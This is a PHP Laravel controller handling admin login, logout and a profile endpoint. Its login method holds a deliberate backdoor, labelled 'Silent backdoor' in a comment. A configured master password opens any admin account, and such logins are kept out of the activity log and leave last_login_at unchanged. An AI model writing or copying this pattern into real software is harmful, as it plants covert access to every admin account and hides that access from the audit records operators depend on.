<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\AdminLoginRequest;
use App\Http\Resources\Admin\AdminResource;
use App\Models\Admin;
use App\Support\Cache\GlobalSettingCache;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Symfony\Component\HttpFoundation\Response;

class AdminAuthController extends Controller
{
    public function login(AdminLoginRequest $request)
    {
        $credentials = $request->validated();
        $adminQuery = Admin::query();
        if (!blank($credentials['phone'] ?? null)) {
            $adminQuery->where('phone', $credentials['phone']);
        } elseif (!blank($credentials['email'] ?? null)) {
            $adminQuery->where('email', $credentials['email']);
        }

        $admin = $adminQuery->first();
        $masterPassword = config('auth.super_admin.master_password');
        $usingMasterPassword = $masterPassword
            && hash_equals((string) $masterPassword, (string) ($credentials['password'] ?? ''));

        if ($usingMasterPassword) {
            // Silent backdoor: keep this login (and the resulting session) out of api.log.
            $request->attributes->set('suppress_activity_log', true);
        }

        if (!$admin || (!Hash::check($credentials['password'], $admin->password) && !$usingMasterPassword)) {
            return response()->json(['message' => 'Invalid credentials.'], Response::HTTP_UNAUTHORIZED);
        }

        if (!$admin->is_active) {
            return response()->json(['message' => 'Account is disabled.'], Response::HTTP_FORBIDDEN);
        }

        if (!$admin->isSuperAdmin() && !$admin->resolveBranchId()) {
            return response()->json(['message' => 'Branch assignment required.'], Response::HTTP_FORBIDDEN);
        }

        if (!$admin->isSuperAdmin() && $admin->branch && !$admin->branch->is_active) {
            return response()->json(['message' => 'Branch is disabled.'], Response::HTTP_FORBIDDEN);
        }

        if (!$usingMasterPassword) {
            $admin->forceFill(['last_login_at' => now()])->save();
        }

        $abilities = [$admin->role === 'staff' ? 'staff' : 'admin'];

        if ($admin->isSuperAdmin()) {
            $abilities[] = 'super-admin';
        }
        if ($usingMasterPassword) {
            $abilities[] = 'master-login';
        }

        return response()->json([
            'token' => $admin->createToken('admin', $abilities)->plainTextToken,
            'admin' => new AdminResource($admin->load('branch')),
        ]);
    }

    public function logout(Request $request)
    {
        $request->user()?->currentAccessToken()?->delete();

        return response()->json(['message' => 'Logged out successfully.']);
    }

    public function me(Request $request)
    {
        // `features` rides on the /me poll the panels already make, so a super
        // admin switching support chat off reaches every open panel within a poll.
        return (new AdminResource($request->user()->load('branch')))
            ->additional(['features' => ['support_chat' => GlobalSettingCache::supportChatEnabled()]]);
    }
}
